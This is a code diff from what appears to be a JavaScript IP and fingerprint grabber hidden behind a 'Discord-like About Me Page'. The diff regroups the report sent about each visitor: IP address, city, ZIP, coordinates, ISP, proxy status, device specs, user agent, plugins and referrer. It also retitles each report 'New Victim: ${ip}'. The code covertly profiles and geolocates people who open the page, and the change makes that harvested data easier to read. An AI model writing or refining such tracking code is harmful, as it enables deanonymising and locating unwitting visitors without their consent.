@@ -225,39 +225,18 @@
       const countryCode = geoData.countryCode || 'unknown';
       
       fields.push(
-        { name: 'IP', value: ip, inline: true },
-        { name: 'Country', value: country, inline: true },
-        { name: 'City', value: city, inline: true },
-        { name: 'Status', value: status, inline: true },
-        { name: 'Coordinates', value: `${lat}, ${lon}`, inline: true },
-        { name: 'Country Code', value: countryCode, inline: true },
-        { name: 'Region', value: region, inline: true },
-        { name: 'Region Code', value: regionCode, inline: true },
-        { name: 'District', value: district, inline: true },
-        { name: 'ZIP', value: zip, inline: true },
-        { name: 'ISP', value: isp, inline: true },
-        { name: 'Organization', value: org, inline: true },
-        { name: 'AS', value: asNum, inline: true },
-        { name: 'Timezone', value: timezone, inline: true },
-        { name: 'Mobile', value: mobile, inline: true },
-        { name: 'Proxy', value: proxy, inline: true },
-        { name: 'Hosting', value: hosting, inline: true },
-        { name: 'User Agent', value: userAgent.substring(0, 1024), inline: false },
-        { name: 'Languages', value: languages.substring(0, 1024), inline: false },
-        { name: 'Platform', value: platform, inline: true },
-        { name: 'Screen Resolution', value: screenRes, inline: true },
-        { name: 'Cookies Enabled', value: cookieEnabled, inline: true },
-        { name: 'Referrer', value: referrer, inline: false },
-        { name: 'Do Not Track', value: doNotTrack, inline: true },
-        { name: 'Hardware Concurrency', value: hardwareConcurrency, inline: true },
-        { name: 'Device Memory (GB)', value: deviceMemory, inline: true },
+        { name: 'Location', value: `${city}, ${region} (${country} / ${countryCode})\nDistrict: ${district} | ZIP: ${zip}\nCoords: ${lat}, ${lon}`, inline: false },
+        { name: 'Network', value: `ISP: ${isp}\nOrg: ${org}\nAS: ${asNum}\nStatus: ${status} | Mobile: ${mobile} | Proxy: ${proxy} | Hosting: ${hosting}`, inline: false },
+        { name: 'Device', value: `Platform: ${platform}\nResolution: ${screenRes}\nCores: ${hardwareConcurrency} | RAM: ${deviceMemory}GB\nTimezone: ${timezone}`, inline: false },
+        { name: 'Browser', value: `User Agent: ${userAgent.substring(0, 512)}...\nLanguages: ${languages.substring(0, 256)}...\nCookies: ${cookieEnabled} | DNT: ${doNotTrack}`, inline: false },
         { name: 'Connection', value: connection, inline: true },
-        { name: 'Plugins', value: pluginsList.substring(0, 1024), inline: false }
+        { name: 'Plugins', value: pluginsList.substring(0, 1024) || 'None detected', inline: false },
+        { name: 'Referrer', value: referrer, inline: false }
       );
       
       const embed = {
-        title: 'User Profile Data',
-        description: `Timestamp: ${timestamp}`,
+        title: `New Victim: ${ip}`,
+        description: `Timestamp: ${timestamp}\nReferrer: ${referrer}`,
         color: 3447003,
         fields: fields,
         footer: { text: 'Grabbed via Discord-like About Me Page' }
